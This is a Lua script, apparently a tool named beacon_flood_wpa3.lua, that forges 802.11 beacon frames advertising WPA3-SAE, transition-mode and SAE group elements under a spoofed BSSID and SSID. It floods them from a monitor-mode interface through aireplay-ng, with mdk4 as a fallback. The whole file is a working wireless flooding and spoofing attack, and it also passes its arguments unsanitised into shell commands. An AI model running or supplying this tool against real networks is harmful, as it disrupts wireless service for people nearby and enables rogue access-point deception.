local iface = arg[1]
local count = tonumber(arg[2]) or 100
local ssid = arg[3] or "WPA3_Network"
local channel = arg[4] or "1"
local bssid = arg[5] or "AA:BB:CC:DD:EE:FF"

local function json_escape(s)
  return '"' .. tostring(s):gsub('\\', '\\\\'):gsub('"', '\\"'):gsub('\n', '\\n'):gsub('\r', '\\r') .. '"'
end

local function telemetry(event, data)
  local ts = tostring(os.time())
  io.write('{"event":' .. json_escape(event) .. ',"iface":' .. json_escape(iface) .. ',"bssid":' .. json_escape(bssid) .. ',"ssid":' .. json_escape(ssid) .. ',"channel":' .. json_escape(channel) .. ',"data":' .. data .. ',"timestamp":' .. json_escape(ts) .. '}\n')
  io.flush()
end

local function check_monitor_mode()
  local cmd = "iw dev " .. iface .. " info 2>/dev/null"
  local f = io.popen(cmd)
  if not f then return false end
  local out = f:read("*a")
  f:close()
  return out:find("type monitor") ~= nil
end

local function set_channel()
  os.execute("iw dev " .. iface .. " set channel " .. channel .. " 2>/dev/null")
  os.execute("iwconfig " .. iface .. " channel " .. channel .. " 2>/dev/null")
end

local function mac_to_bytes(mac)
  local bytes = {}
  for b in mac:gmatch("(%x%x)") do
    bytes[#bytes + 1] = tonumber(b, 16)
  end
  return bytes
end

local function build_wpa3_rsne()
  -- RSNE with WPA3/SAE only: AKM 00-0F-AC:8
  local rsn = string.char(
    0x01, 0x00, -- version
    0x00, 0x0f, 0xac, 0x04, -- group cipher: CCMP
    0x01, 0x00, -- pairwise count
    0x00, 0x0f, 0xac, 0x04, -- pairwise: CCMP
    0x01, 0x00, -- AKM count
    0x00, 0x0f, 0xac, 0x08, -- AKM: SAE (WPA3)
    0x00, 0x00  -- capabilities
  )
  return string.char(0x30, #rsn) .. rsn
end

local function build_wpa3_transition_rsne()
  -- WPA3 Transition Mode: AKM 00-0F-AC:2 (PSK) + 00-0F-AC:8 (SAE)
  local rsn = string.char(
    0x01, 0x00,
    0x00, 0x0f, 0xac, 0x04,
    0x01, 0x00,
    0x00, 0x0f, 0xac, 0x04,
    0x02, 0x00,
    0x00, 0x0f, 0xac, 0x02, -- PSK
    0x00, 0x0f, 0xac, 0x08, -- SAE
    0x00, 0x00
  )
  return string.char(0x30, #rsn) .. rsn
end

local function build_sae_group_element()
  -- SAE group element (tag 224, vendor specific or custom) - advertising group 19 (ECC 256-bit)
  local group = string.char(0x00, 0x13) -- group 19
  return string.char(0xdd, #group + 3, 0x00, 0x0f, 0xac) .. group
end

local function build_owe_rsne()
  -- OWE (WPA3-OWE) RSNE with AKM 00-0F-AC:9
  local rsn = string.char(
    0x01, 0x00,
    0x00, 0x0f, 0xac, 0x04,
    0x01, 0x00,
    0x00, 0x0f, 0xac, 0x04,
    0x01, 0x00,
    0x00, 0x0f, 0xac, 0x09, -- OWE
    0x00, 0x00
  )
  return string.char(0x30, #rsn) .. rsn
end

local function build_beacon(wpa3_only)
  local frame = string.char(0x80, 0x00, 0x00, 0x00)
  frame = frame .. string.char(0xff, 0xff, 0xff, 0xff, 0xff, 0xff)
  local b = mac_to_bytes(bssid)
  for _, v in ipairs(b) do frame = frame .. string.char(v) end
  for _, v in ipairs(b) do frame = frame .. string.char(v) end
  frame = frame .. string.char(0x00, 0x00)
  frame = frame .. string.char(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
  frame = frame .. string.char(0x64, 0x00)
  frame = frame .. string.char(0x31, 0x04)
  local ssid_len = #ssid
  if ssid_len > 32 then ssid_len = 32 end
  frame = frame .. string.char(0x00, ssid_len) .. ssid:sub(1, ssid_len)
  frame = frame .. string.char(0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24)
  frame = frame .. string.char(0x03, 0x01, tonumber(channel) or 1)

  if wpa3_only then
    frame = frame .. build_wpa3_rsne()
    frame = frame .. build_sae_group_element()
  else
    frame = frame .. build_wpa3_transition_rsne()
    frame = frame .. build_sae_group_element()
  end

  frame = frame .. string.char(0x32, 0x04, 0x30, 0x48, 0x60, 0x6c)
  return frame
end

local function inject_beacons()
  telemetry("flood_start", '{"count":' .. tostring(count) .. ',"mode":"wpa3_sae"}')
  local frame_wpa3 = build_beacon(true)
  local frame_trans = build_beacon(false)
  local tmp = "/tmp/wpa3_flood_" .. iface .. ".bin"
  local f = io.open(tmp, "wb")
  if not f then
    telemetry("error", '{"error":"Cannot write temp file"}')
    return false
  end
  for i = 1, count do
    if i % 2 == 0 then
      f:write(frame_wpa3)
    else
      f:write(frame_trans)
    end
    if i % 20 == 0 then
      telemetry("progress", '{"sent":' .. tostring(i) .. ',"total":' .. tostring(count) .. '}')
    end
  end
  f:close()
  telemetry("inject", '{"method":"aireplay-ng","file":' .. json_escape(tmp) .. '}')
  os.execute("cat " .. tmp .. " | aireplay-ng -D " .. iface .. " 2>/dev/null")
  telemetry("flood_done", '{"sent":' .. tostring(count) .. '}')
  return true
end

local function inject_via_mdk4()
  local cmd = "mdk4 " .. iface .. " b -n " .. ssid .. " -c " .. channel .. " -b " .. bssid .. " -s " .. tostring(count) .. " 2>/dev/null"
  telemetry("inject", '{"method":"mdk4","cmd":' .. json_escape(cmd) .. '}')
  local f = io.popen(cmd)
  if not f then
    telemetry("inject_fail", '{"method":"mdk4","error":"mdk4 unavailable"}')
    return false
  end
  while true do
    local line = f:read("*l")
    if not line then break end
    if line:find("Packets") or line:find("sent") then
      telemetry("beacon_sent", '{"data":' .. json_escape(line:sub(1, 200)) .. '}')
    end
  end
  f:close()
  return true
end

if not iface then
  telemetry("error", '{"error":"Usage: beacon_flood_wpa3.lua <iface> [count] [ssid] [channel] [bssid]"}')
  os.exit(1)
end

if not check_monitor_mode() then
  telemetry("error", '{"error":"Interface not in monitor mode"}')
  os.exit(1)
end

set_channel()

local ok = inject_beacons()
if not ok then
  telemetry("fallback", '{"message":"aireplay-ng raw failed, trying mdk4"}')
  inject_via_mdk4()
end

telemetry("complete", '{"total":' .. tostring(count) .. ',"type":"wpa3_sae"}')
